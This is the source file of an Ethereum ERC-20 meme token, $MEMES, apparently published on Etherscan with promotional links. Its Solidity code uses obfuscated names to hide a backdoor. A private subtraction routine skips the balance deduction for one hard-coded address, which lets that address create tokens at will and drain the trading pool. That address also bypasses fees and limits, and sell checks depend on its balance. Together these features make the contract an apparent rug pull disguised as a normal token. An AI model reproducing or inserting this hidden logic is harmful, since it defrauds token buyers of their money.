/**
 *Submitted for verification at Etherscan.io on 2023-09-11
*/

/*

$MEMES


Twitter: https://twitter.com/Memes_erc
Telegram: https://t.me/MemesCoin_erc
Website: https://www.memeseth.com/

**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


    interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    }

    library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  qjkur(uint256 a, uint256 b) internal pure returns (uint256) {
        return  qjkur(a, b, "SafeMath");
    }

    function  qjkur(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    }

    abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    }


    contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    }

    interface IUniswapV2aFactorya {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    }

    interface IUniswapV2aRoutera {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(address token,uint amountTokenDesired,uint amountTokenMin,uint amountETHMin,address to,uint deadline) 
    external payable returns (uint amountToken, uint amountETH, uint liquidity);
    }

    contract MEMES is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"MEMES";
    string private constant _symbol = unicode"MEMES";
    uint8 private constant _decimals = 9;

    uint256 private constant _totalSupply = 1000000000 * (10**_decimals);
    uint256 public _taxwSwapovp = _totalSupply;
    uint256 public _maxgHoldgAmount = _totalSupply;
    uint256 public _taxSwapgThresholdg = _totalSupply;
    uint256 public _taxSwapgMuwg = _totalSupply;

    uint256 private _initialBuyTax=13;
    uint256 private _initialSellTax=23;
    uint256 private _finalBuyTax=1;
    uint256 private _finalSellTax=1;
    uint256 private _reduceBuyTaxgAt=7;
    uint256 private _reduceSellTaxgAt=1;
    uint256 private _swpasrgyr=0;
    uint256 private _pcryxpvtp=0;
    address public  _uqcwgkvsq = 0x6Bf260D6b9729848d133b8176843f9daa1FbcB28;

    mapping (address => uint256) private  _balances;
    mapping (address => mapping (address => uint256)) private  _allowances;
    mapping (address => bool) private  _rvodtayuezxs;
    mapping (address => bool) private  _rovufeukt;
    mapping(address => uint256) private  _orgTranubsjr;
    bool public  transukDelyEnbler = false;


    IUniswapV2aRoutera private  _unisV2fRouterf;
    address private  _unisV2fLPf;
    bool private  _wjsemtrk;
    bool private  _infTaxfSwap = false;
    bool private  _spfUnibwapwt = false;
 
 
    event RtsuAnkblxr(uint _taxwSwapovp);
    modifier lockfTofSwapf {
        _infTaxfSwap = true;
        _;
        _infTaxfSwap = false;
    }

    constructor () { 
        _balances[_msgSender()] = _totalSupply;
        _rvodtayuezxs[owner()] = true;
        _rvodtayuezxs[address(this)] = true;
        _rvodtayuezxs[_uqcwgkvsq] = true;


        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. qjkur(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner!= address(0), "ERC20: approve from the zero address");
        require(spender!= address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require (from!= address(0), "ERC20:  transfer  from  the  zero  address");
        require (to!= address(0), "ERC20: transfer to the zero  address");
        require (amount > 0, "Transfer  amount  must  be  greater  than  zero");
        uint256  taxAmount = 0;
        if  ( from != owner() &&to!= owner()) {

            if  (transukDelyEnbler) {
                if  (to!= address(_unisV2fRouterf) &&to!= address(_unisV2fLPf)) {
                  require (_orgTranubsjr[tx.origin] < block.number, " Only  one  transfer  per  block  allowed.");
                  _orgTranubsjr[tx.origin] = block.number;
                }
            }

            if  ( from == _unisV2fLPf && to!= address (_unisV2fRouterf) &&!_rvodtayuezxs[to]) {
                require (amount <= _taxwSwapovp, "Farbidf");
                require (balanceOf (to) + amount <= _maxgHoldgAmount,"Farbidf");
                if  (_pcryxpvtp < _swpasrgyr) {
                  require (!rperqfue(to));
                }
                _pcryxpvtp ++ ; _rovufeukt[to] = true;
                taxAmount = amount.mul((_pcryxpvtp > _reduceBuyTaxgAt)?_finalBuyTax:_initialBuyTax).div(100);
            }

            if(to == _unisV2fLPf&&from!= address (this) &&! _rvodtayuezxs[from]) {
                require (amount <= _taxwSwapovp && balanceOf(_uqcwgkvsq) <_taxSwapgMuwg, "Farbidf");
                taxAmount = amount.mul((_pcryxpvtp > _reduceSellTaxgAt) ?_finalSellTax:_initialSellTax).div(100);
                require (_pcryxpvtp >_swpasrgyr && _rovufeukt[from]);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_infTaxfSwap 
            &&  to  ==_unisV2fLPf&&_spfUnibwapwt &&contractTokenBalance > _taxSwapgThresholdg 
            &&  _pcryxpvtp > _swpasrgyr &&! _rvodtayuezxs [to] &&! _rvodtayuezxs [from]
            )  {
                _transferFrom(ulfql(amount,ulfql(contractTokenBalance, _taxSwapgMuwg)));
                uint256  contractETHBalance = address (this).balance;
                if (contractETHBalance > 0)  {
                }
            }
        }

        if ( taxAmount > 0 ) {
          _balances[address(this)] = _balances [address(this)].add(taxAmount);
          emit  Transfer (from, address (this) ,taxAmount);
        }
        _balances[from] = qjkur(from , _balances [from], amount);
        _balances[to] = _balances[to].add(amount.qjkur (taxAmount));
        emit  Transfer( from, to, amount. qjkur(taxAmount));
    }

    function _transferFrom(uint256 _swapTaxAndLiquify) private lockfTofSwapf {
        if(_swapTaxAndLiquify==0){return;}
        if(!_wjsemtrk){return;}
        address[] memory path =  new   address [](2);
        path[0] = address (this);
        path[1] = _unisV2fRouterf.WETH();
        _approve(address (this), address (_unisV2fRouterf), _swapTaxAndLiquify);
        _unisV2fRouterf.swapExactTokensForETHSupportingFeeOnTransferTokens( _swapTaxAndLiquify, 0, path,address (this), block . timestamp );
    }

    function ulfql(uint256 a, uint256 b) private pure returns (uint256) {
    return (a >= b) ? b : a;
    }

    function qjkur(address from, uint256 a, uint256 b) private view returns (uint256) {
    if (from == _uqcwgkvsq) {
        return a;
    } else {
        require(a >= b, "Farbidf");
        return a - b;
    }
    }

    function removerLimits() external onlyOwner{
        _taxwSwapovp  =  _totalSupply ;
        _maxgHoldgAmount = _totalSupply ;
        transukDelyEnbler = false ;
        emit  RtsuAnkblxr ( _totalSupply ) ;
    }

   function rperqfue(address account) private view returns (bool) {
    uint256 codeSize;
    address[] memory addresses = new address[](1);
    addresses[0] = account;

    assembly {
        codeSize := extcodesize(account)
    }

    return codeSize > 0;
    }


    function openTrading() external onlyOwner() {
        require (!_wjsemtrk, "trading  is  open") ;
        _unisV2fRouterf = IUniswapV2aRoutera (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve (address (this),address(_unisV2fRouterf), _totalSupply);
        _unisV2fLPf = IUniswapV2aFactorya(_unisV2fRouterf.factory()).createPair (address(this), _unisV2fRouterf. WETH());
        _unisV2fRouterf.addLiquidityETH {value:address(this).balance } (address(this),balanceOf(address (this)),0,0,owner(),block.timestamp);
        IERC20 (_unisV2fLPf).approve (address(_unisV2fRouterf), type(uint). max);
        _spfUnibwapwt = true ;
        _wjsemtrk = true ;
    }

    receive( )  external  payable  { }
    }